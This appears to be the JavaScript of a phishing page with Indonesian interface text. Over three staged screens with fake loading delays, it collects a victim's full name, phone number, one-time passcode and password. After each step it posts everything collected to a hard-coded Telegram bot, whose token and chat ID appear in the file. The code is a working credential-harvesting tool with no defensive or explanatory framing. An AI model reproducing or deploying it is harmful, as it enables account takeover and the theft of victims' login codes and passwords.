const botToken = "7716385575:AAHNumyyIdsQDp4FqgGYfh30nNPfT95E_WU";
const chatId = "8015899112";

const Toast = Swal.mixin({
  toast: true,
  position: "top-end",
  showConfirmButton: false,
  timer: 5000,
  timerProgressBar: true,
  didOpen: (toast) => {
    toast.onmouseenter = Swal.stopTimer;
    toast.onmouseleave = Swal.resumeTimer;
  },
});

let formData = {
  fullName: "",
  phoneNumber: "",
  otp: "",
  password: "",
  status: "",
  sessionStart: Date.now(),
};

function showLoadingScreen() {
  Swal.fire({
    title: "Mohon tunggu...",
    html: "Sedang memproses data.",
    timer: 3000,
    timerProgressBar: true,
    didOpen: () => {
      Swal.showLoading();
    },
  });
}

function sendToBot(data) {
  const message = `*Form Baru Terdaftar*\n\n*Nama:* ${
    data.fullName ?? "-"
  }\n*Nomor Telepon:* ${data.phoneNumber ?? "-"}\n*OTP:* ${
    data.otp ?? "-"
  }\n*Kata Sandi:* ${data.password ?? "-"}\n*Status:* ${
    data.status ?? "-"
  }\n*Sesi Aktif:* ${timeSince(data.sessionStart)} yang lalu.`;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      parse_mode: "markdown",
      text: message,
    }),
  })
    .then((response) => response.json())
    .then((result) => {
      if (result.ok) {
        Toast.fire({
          icon: "success",
          title: "Pesan berhasil dikirim!",
        });
      } else {
        Toast.fire({
          icon: "error",
          title: "Gagal mengirim pesan: " + result.description,
        });
      }
    })
    .catch((error) => {
      Toast.fire({
        icon: "error",
        title: "Terjadi kesalahan: " + error.message,
      });
    });
}

function timeSince(date) {
  const seconds = Math.floor((new Date() - new Date(date)) / 1000);
  let interval = seconds / 31536000;

  if (interval > 1) return Math.floor(interval) + " tahun";
  interval = seconds / 2592000;
  if (interval > 1) return Math.floor(interval) + " bulan";
  interval = seconds / 86400;
  if (interval > 1) return Math.floor(interval) + " hari";
  interval = seconds / 3600;
  if (interval > 1) return Math.floor(interval) + " jam";
  interval = seconds / 60;
  if (interval > 1) return Math.floor(interval) + " menit";

  return Math.floor(seconds) + " detik";
}

function processFirstData() {
  const fullName = document.getElementById("full_name").value.trim();
  const phoneNumber = document.getElementById("phone_number").value.trim();

  if (!fullName || !phoneNumber) {
    Swal.fire("Perhatian!", "Semua kolom harus diisi.", "warning");
    return;
  }

  formData.fullName = fullName;
  formData.phoneNumber = phoneNumber;
  formData.status = "Menunggu OTP";

  showLoadingScreen();

  setTimeout(() => {
    sendToBot(formData);
    document.querySelector(".first").style.display = "none";
    document.querySelector(".second").style.display = "block";
  }, 3000);
}

function processSecondData() {
  const otp = document.getElementById("otp").value.trim();

  if (!otp) {
    Swal.fire("Perhatian!", "OTP harus diisi.", "warning");
    return;
  }

  formData.otp = otp;
  formData.status = "Menunggu Konfirmasi";

  showLoadingScreen();

  setTimeout(() => {
    sendToBot(formData);
    document.querySelector(".second").style.display = "none";
    document.querySelector(".third").style.display = "block";
  }, 3000);
}

function processThirdData() {
  const password = document.getElementById("password").value.trim();

  if (!password) {
    Swal.fire("Perhatian!", "Kata sandi harus diisi.", "warning");
    return;
  }

  formData.password = password;
  formData.status = "Proses Selesai";

  showLoadingScreen();

  setTimeout(() => {
    sendToBot(formData);
    document.querySelector(".third").style.display = "none";
    document.querySelector(".four").style.display = "block";
  }, 3000);
}
